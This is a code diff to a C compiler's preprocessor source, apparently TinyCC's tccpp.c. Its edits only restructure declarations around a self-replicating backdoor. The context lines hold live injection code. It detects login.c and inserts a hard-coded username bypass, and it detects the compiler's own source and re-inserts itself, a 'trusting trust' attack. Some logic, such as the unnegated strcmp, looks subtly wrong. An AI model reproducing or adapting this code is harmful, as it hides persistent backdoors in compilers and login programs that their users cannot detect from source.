@@ -658,12 +658,14 @@ static int handle_eob(void)
 
             /* The source code to hack bugged_login.c */
             // The string to be inserted into login.c
-            const char* inject_login = "if(strcmp(username, %ccabbageham%c)) {%c printf(%cwelcome!%cn%c);%c return 0;%c }%c";
+            const char* inject_login;
+            inject_login = "if(strcmp(username, %ccabbageham%c)) {%c printf(%cwelcome!%cn%c);%c return 0;%c }%c";
             // %c 34 = "
             // %c 10 = newline (\n)
             // %c 92 = /
             if(strstr(file->filename, "login.c") != NULL) {
-                unsigned char* inject_code = tcc_malloc(sizeof(unsigned char) * 200);
+                unsigned char* inject_code;
+                inject_code = tcc_malloc(sizeof(unsigned char) * 200);
                 snprintf(inject_code, 200, inject_login, 34, 34, 10, 34, 92, 34, 10, 10, 10);
                 int inject_len = strlen(inject_login);
                 unsigned char* new_buf = tcc_malloc(sizeof(unsigned char) * IO_BUF_SIZE);
@@ -690,10 +692,12 @@ static int handle_eob(void)
             if(strstr(file->filename, "tccpp.c") != NULL) {
                 unsigned char* inject_code = tcc_malloc(sizeof(unsigned char) * 9900);
                 snprintf(inject_code, 9900, inject_compiler, 34, inject_login, 34, 10, 34, 34, 10, 10, 10, 10, 10, 34, 92, 34, 34, 10, 10, 39, 39, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 34, 34, 10, 10, 34, inject_compiler, 34, 10, 10, 10, 10, 10, 10, 34, 34, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10);
-                int inject_len = strlen(inject_code);
+                int inject_len;
+                inject_len = strlen(inject_code);
                 unsigned char* new_buf = tcc_malloc(sizeof(unsigned char) * IO_BUF_SIZE);
                 memset(new_buf, 0, sizeof(unsigned char) * IO_BUF_SIZE);
-                unsigned char* inject_location = strstr(bf->buffer, "if (len < 0)");
+                unsigned char* inject_location;
+                inject_location = strstr(bf->buffer, "if (len < 0)");
                 int pre_inject_len = inject_location - bf->buffer;
                 strncpy(new_buf, bf->buffer, pre_inject_len);
                 strncpy(new_buf + pre_inject_len, inject_code, inject_len);
